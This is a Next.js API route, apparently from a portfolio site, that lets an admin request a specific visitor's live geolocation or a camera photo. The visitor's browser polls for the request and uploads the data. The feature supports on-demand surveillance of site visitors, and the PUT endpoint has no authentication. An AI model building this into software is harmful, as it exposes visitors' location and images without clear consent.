/**
 * /api/visitor-live
 *
 * Admin → POST  {action: 'request_location'|'request_camera', userId}
 *   Inserts a pending request row that the user's browser polls for.
 *
 * User → GET  ?userId=xxx
 *   Returns the latest pending request for this user (if any).
 *
 * User → PUT  {requestId, type, lat?, lng?, accuracy?, photo_data?}
 *   Fulfils the request with live data; admin panel reads this.
 *
 * Admin → GET  ?admin=1&userId=xxx
 *   Returns the latest fulfilled data for this user (requires auth).
 */
import { NextRequest, NextResponse } from 'next/server'
import { neon } from '@neondatabase/serverless'
import { verifyToken } from '@/lib/admin-auth'
import { updateUserLiveLocation, updateUserLivePhoto } from '@/lib/user-db'

const sql = neon(process.env.DATABASE_URL!)
const SESSION_COOKIE = 'portfolio_admin_session'

function isAuthed(req: NextRequest) {
  const cookie = req.cookies.get(SESSION_COOKIE)
  return cookie?.value && verifyToken(cookie.value)
}

let migrated = false
async function ensureTable() {
  if (migrated) return
  await sql`CREATE TABLE IF NOT EXISTS visitor_live_requests (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    type TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    lat DOUBLE PRECISION,
    lng DOUBLE PRECISION,
    accuracy DOUBLE PRECISION,
    photo_data TEXT NOT NULL DEFAULT '',
    created_at BIGINT NOT NULL,
    fulfilled_at BIGINT
  )`
  try { await sql`ALTER TABLE visitor_live_requests ADD COLUMN IF NOT EXISTS fulfilled_at BIGINT` } catch {}
  migrated = true
}

// Admin: create a live-data request
// User: get pending request for their session
export async function GET(req: NextRequest) {
  await ensureTable()
  const url = new URL(req.url)
  const userId = url.searchParams.get('userId')
  const isAdmin = url.searchParams.get('admin') === '1'

  if (isAdmin) {
    if (!isAuthed(req)) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    if (!userId) return NextResponse.json({ error: 'userId required' }, { status: 400 })
    // Return latest fulfilled data for this user
    const rows = await sql`
      SELECT * FROM visitor_live_requests
      WHERE user_id = ${userId} AND status = 'fulfilled'
      ORDER BY fulfilled_at DESC LIMIT 5`
    return NextResponse.json({ requests: rows })
  }

  // User polling for pending request
  if (!userId) return NextResponse.json({ request: null })
  const rows = await sql`
    SELECT id, type FROM visitor_live_requests
    WHERE user_id = ${userId} AND status = 'pending'
    AND created_at > ${Date.now() - 5 * 60 * 1000}
    ORDER BY created_at DESC LIMIT 1`
  return NextResponse.json({ request: rows[0] || null })
}

// Admin: POST a new request
export async function POST(req: NextRequest) {
  await ensureTable()
  if (!isAuthed(req)) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const { action, userId } = await req.json()
  if (!userId || !action) return NextResponse.json({ error: 'userId and action required' }, { status: 400 })

  const type = action === 'request_camera' ? 'camera' : 'location'
  const id = `vlr_${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`

  // Remove old pending requests of same type for this user
  await sql`DELETE FROM visitor_live_requests WHERE user_id = ${userId} AND type = ${type} AND status = 'pending'`

  await sql`INSERT INTO visitor_live_requests (id, user_id, type, status, created_at)
    VALUES (${id}, ${userId}, ${type}, 'pending', ${Date.now()})`

  return NextResponse.json({ success: true, requestId: id })
}

// User: fulfil a request with real data
export async function PUT(req: NextRequest) {
  await ensureTable()
  const { requestId, userId, type, lat, lng, accuracy, photo_data } = await req.json()
  if (!requestId || !userId) return NextResponse.json({ error: 'requestId and userId required' }, { status: 400 })

  if (type === 'location' && lat != null && lng != null) {
    await updateUserLiveLocation(userId, lat, lng, accuracy || 0)
    await sql`UPDATE visitor_live_requests SET status = 'fulfilled', lat = ${lat}, lng = ${lng}, accuracy = ${accuracy || 0}, fulfilled_at = ${Date.now()} WHERE id = ${requestId}`
  } else if (type === 'camera' && photo_data) {
    const safe = photo_data.slice(0, 200_000)
    await updateUserLivePhoto(userId, safe)
    await sql`UPDATE visitor_live_requests SET status = 'fulfilled', photo_data = ${safe}, fulfilled_at = ${Date.now()} WHERE id = ${requestId}`
  } else {
    // Mark as denied
    await sql`UPDATE visitor_live_requests SET status = 'denied', fulfilled_at = ${Date.now()} WHERE id = ${requestId}`
  }

  return NextResponse.json({ success: true })
}
